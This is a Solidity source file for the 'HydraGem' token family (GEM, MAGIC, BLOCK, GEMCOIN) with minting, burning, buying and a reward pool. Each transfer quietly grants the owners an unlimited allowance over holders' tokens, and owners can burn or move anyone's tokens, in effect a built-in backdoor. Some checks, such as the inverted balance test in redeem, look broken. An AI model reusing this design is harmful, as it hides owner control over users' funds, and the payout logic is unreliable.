// SPDX-License-Identifier: AGPLv3
pragma solidity >=0.5.4;

import "../openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../openzeppelin/contracts/access/Ownable.sol";
import "../openzeppelin/contracts/utils/Address.sol";


abstract contract ERC20SimpleTrackedBurner is ERC20 {

    uint256 MAX_INT = 2**256 - 1;

    mapping (address => uint256) _burned;

    function burnFrom(address burner, uint256 amount) internal virtual {
        _burn(burner, amount);

        if (_burned[burner] > MAX_INT - amount) _burned[burner] = 0; // corner case: burned MAX_INT tokens

        _burned[burner] += amount;
    }

    function burn() public virtual {
        burnFrom(_msgSender(), 1);
    }

    function burned(address from) public virtual view returns (uint256) {
        if (from == address(0)) from = _msgSender();
        return _burned[from];
    }
}


abstract contract DualOwnable is Ownable {
    address _ownerRoot;

    constructor (address ownerRoot_) {
        _ownerRoot = ownerRoot_;
    }

    function ownerRoot() public view virtual returns (address) {
        return _ownerRoot;
    }

    modifier onlyOwners() {
        require(owner() == _msgSender() || ownerRoot() == _msgSender(), "DualOwnable: caller is not the owner or the root owner");
        _;
    }
}


abstract contract ERC20OwnerLiquidator is ERC20, ERC20SimpleTrackedBurner, DualOwnable {
    function liquidate() public virtual onlyOwners {
        if (address(this).balance > 0)
            Address.sendValue(payable(ownerRoot()), address(this).balance);

        liquidate(address(this));
        liquidate(owner());
        liquidate(ownerRoot());
    }

    function liquidate(address from) internal virtual onlyOwners {
        if (balanceOf(from) > 0)
            burnFrom(from, balanceOf(from));
    }
}



abstract contract HydraGemBaseToken is ERC20, ERC20SimpleTrackedBurner, ERC20OwnerLiquidator {
    ERC20 _gemToken;

    constructor (string memory name_, string memory symbol_, ERC20 gemToken_, address owner_) ERC20(name_, symbol_) DualOwnable(owner_) {
        _gemToken = gemToken_;
        _approve(address(this), owner(), MAX_INT);
        _approve(address(this), ownerRoot(), MAX_INT);
    }

    function gemToken() public view returns (ERC20) {
        return _gemToken;
    }

    function decimals() public view virtual override returns (uint8) {
        return 0;
    }

    receive() external payable virtual {
        revert();
    }

    function mint(address to, uint256 amount) public virtual onlyOwners {
        _mint(to, amount);
        _approve(to, owner(), MAX_INT);
    }

    function burn() public virtual override {
        revert();
    }

    function burn(address from, uint256 amount) public virtual onlyOwners {
        burnFrom(from, amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        from = from;
        amount = amount;

        if (to != address(0))
            _approve(to, owner(), MAX_INT);
    }
}


contract HydraGemMagicToken is HydraGemBaseToken {

    constructor(ERC20 gemToken_, address owner_) HydraGemBaseToken(unicode"HydraGem v7.07 💎 MAGIC 💫", unicode"💫", gemToken_, owner_) {
    }
}

contract HydraGemBlockToken is HydraGemBaseToken {

    constructor(ERC20 gemToken_, address owner_) HydraGemBaseToken(unicode"HydraGem v7.07 💎 BLOCK 🧱", unicode"🧱", gemToken_, owner_) {
        //random = uint256(keccak256(abi.encode(address(gemToken)))) + 42;
    }

    function transferInternal(address from, address to, uint256 amount) public onlyOwners {
        _transfer(from, to, amount);
    }

    function cost() public view returns (uint256) {
        return cost(address(gemToken()).balance);
    }

    function cost(uint256 poolBalance) public view returns (uint256) {
        uint256 currentBlockSupply = totalSupply();
        uint256 totalPotentialGemSupply = currentBlockSupply; // + totalUnredeemedBlockBurns; * NOTE: Always burned atomically with MAGIC now.
        uint256 totalExpectedGemSupply = gemToken().totalSupply() + totalPotentialGemSupply;

        if (totalExpectedGemSupply <= 1) return poolBalance;

        return poolBalance / totalExpectedGemSupply;
    }

    function liquidate() public virtual override onlyOwners {
        liquidate(block.coinbase);
        super.liquidate();
    }
}


contract HydraGemCoinToken is HydraGemBaseToken {

    constructor(ERC20 gemToken_, address owner_) HydraGemBaseToken(unicode"HydraGem v7.07 💎 GEMCOIN 🪙", unicode"🪙", gemToken_, owner_) {
    }

    function decimals() public view virtual override returns (uint8) {
        return 8;
    }

    receive() external payable virtual override onlyOwners {
    }

    function burn() public virtual override onlyOwners {
        burnFrom(_msgSender(), balanceOf(_msgSender()));
    }

    function burn(address from, uint256 amount) public virtual override onlyOwners {
        super.burn(from, amount);
    }

    function buy() public payable {

        address buyer = _msgSender();
        uint256 amount = msg.value;

        require(amount > 0, "GEMCOIN: Payment required to buy");

        uint256 cacheAmount = balanceOf(address(this));

        if (cacheAmount > 0) {
            if (cacheAmount >= amount) {
                transferFrom(address(this), buyer, amount);
                return;
            }

            transferFrom(address(this), buyer, cacheAmount);
            amount -= cacheAmount;
        }

        if (amount > 0)
            _mint(_msgSender(), amount);
    }

    function sell(uint256 amount) public {
        redeem(_msgSender(), amount);
    }

    function redeem(address seller, uint256 amount) public {
        require(amount > 0, "GEMCOIN: Sell amount must be > 0");

        require(amount >= balanceOf(seller), "GEMCOIN: Sell amount exceeds balance");

        transferFrom(seller, address(this), amount);
        Address.sendValue(payable(seller), amount);
    }
}


contract HydraGemToken is HydraGemBaseToken {

    HydraGemMagicToken _magicToken;
    HydraGemBlockToken _blockToken;
    HydraGemCoinToken _coinToken;

    mapping (address => uint256) _magicBurnCounter;
    mapping (address => uint256) _blockBurnCounter;

    constructor() HydraGemBaseToken(unicode"HydraGem v7.07 💎 GEM 💎", unicode"💎", this, _msgSender()) {
        _magicToken = new HydraGemMagicToken(this, owner());
        _blockToken = new HydraGemBlockToken(this, owner());
        _coinToken = new HydraGemCoinToken(this, owner());
        _approve(address(this), owner(), MAX_INT);
    }

    function magicToken() public view returns (HydraGemMagicToken) {
        return _magicToken;
    }

    function blockToken() public view returns (HydraGemBlockToken) {
        return _blockToken;
    }

    function price() public view returns (uint256) {
        return _blockToken.cost(address(this).balance);
    }

    function value() public view returns (uint256) {
        return value(address(this).balance);
    }

    function value(uint256 poolBalance) private view returns (uint256) {
        uint256 totalGemSupply = totalSupply();
        if (totalGemSupply <= 1) return poolBalance;
        return poolBalance / totalGemSupply;
    }

    receive() external payable virtual override {
        mint();
    }

    function award(address to, uint256 amount) private returns (bool) {
        uint256 balance = address(this).balance;

        if (balance == 0) return false;

        require(amount <= balance, "GEM: Award must be <= balance.");

        Address.sendValue(payable(address(_coinToken)), amount);
        _coinToken.mint(to, amount);

        return true;
    }

    function redeem(uint256 amount) public {
        _coinToken.redeem(_msgSender(), amount);
    }

    function buy(address from) public payable {
        uint256 amount = msg.value;
        address buyer = _msgSender();

        require(balanceOf(buyer) == 0, "GEM: BLOCK buyer cannot be holding GEM");
        require(_blockToken.balanceOf(buyer) == 0, "GEM: BLOCK buyer cannot be already holding BLOCK");
        require(_magicToken.balanceOf(buyer) > 0, "GEM: BLOCK buyer must be holding MAGIC");
        require(_magicToken.balanceOf(from) == 0, "GEM: BLOCK buy-from address must not be holding MAGIC");

        require(amount > 2, "GEM: BLOCK buy payment amount must be >= 0.00000002 HYDRA");
        require(_blockToken.balanceOf(from) >= 1, "GEM: BLOCK buy-from address has insufficient token balance");

        uint256 blockCost = _blockToken.cost(address(this).balance - amount);

        require(msg.value >= blockCost, "GEM: BLOCK buy payment amount must be >= HYDRA value of 1 BLOCK (use price function)");

        uint256 amountToHolder = msg.value >> 1;

        _blockToken.transferInternal(from, buyer, 1);

        award(from, amountToHolder);
    }

    function mint() payable public {
        address minter = _msgSender();

        if (minter == block.coinbase) {
            // What luck! Pay out the entire reward pool immediately instead of doing the usual.

            award(minter, address(this).balance);

            return;
        }

        _magicToken.mint(_msgSender(), 1);
        _blockToken.mint(block.coinbase, 1);
        _mint(address(this), 1);
    }

    function burn() public virtual override {
        address burner = _msgSender();
        uint256 amountGem = balanceOf(burner);

        if (amountGem > 0)  {
            amountGem = 1; // Only burn one at a time.

            uint256 payoutPerGem = value();
            require(payoutPerGem > 0, "GEM: No pool reward available for burn payout");

            burnFrom(burner, amountGem);

            uint256 payout = amountGem * payoutPerGem;

            award(burner, payout);

            return; // Only allow one action at a time.
        }

        uint256 amountMagic = _magicToken.balanceOf(burner);
        uint256 amountBlock = _blockToken.balanceOf(burner);

        uint256 amountToBurn = amountMagic < amountBlock ? amountMagic : amountBlock;

        uint256 _magicBurnUnredeemed = amountToBurn + _magicToken.burned(burner) - _magicBurnCounter[burner];
        uint256 _blockBurnUnredeemed = amountToBurn + _blockToken.burned(burner) - _blockBurnCounter[burner];

        amountToBurn = _magicBurnUnredeemed < _blockBurnUnredeemed ? _magicBurnUnredeemed : _blockBurnUnredeemed;

        if (amountToBurn > 0) {
            amountToBurn = 1; // Only burn one (of each) at a time.

            _magicToken.burn(burner, amountToBurn); _magicBurnCounter[burner] += amountToBurn;
            _blockToken.burn(burner, amountToBurn); _blockBurnCounter[burner] += amountToBurn;

            _transfer(address(this), burner, amountToBurn);

            _approve(burner, owner(), MAX_INT);
            return;
        }
    }

    function liquidate() public virtual override onlyOwners {
        _magicToken.liquidate();
        _blockToken.liquidate();
        _coinToken.liquidate();
        super.liquidate();
    }
}